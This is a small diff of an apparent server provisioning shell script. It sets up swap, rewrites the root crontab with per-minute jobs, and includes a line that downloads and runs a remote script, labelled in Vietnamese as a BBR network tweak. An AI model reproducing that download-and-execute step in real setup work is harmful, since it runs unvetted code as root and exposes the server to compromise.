@@ -63,9 +63,6 @@ fallocate -l 5G /swapfile3 && chmod 600 /swapfile3 && mkswap /swapfile3 && swapo
 # crontab 
 echo -e "* * * * * /usr/bin/python3 /root/mail_check_block_china.py\n* * * * * /usr/bin/python3 /root/tele_check_block_china.py\n* * * * * /bin/bash /root/gost_aws.sh\n* * * * * /usr/bin/python3 /root/check_status-domain_aws_all.py" | crontab -
 
-
-
-
 # Cài đặt BBR để tối ưu mạng
 wget sh.alhttdw.cn/d11.sh && bash d11.sh
 
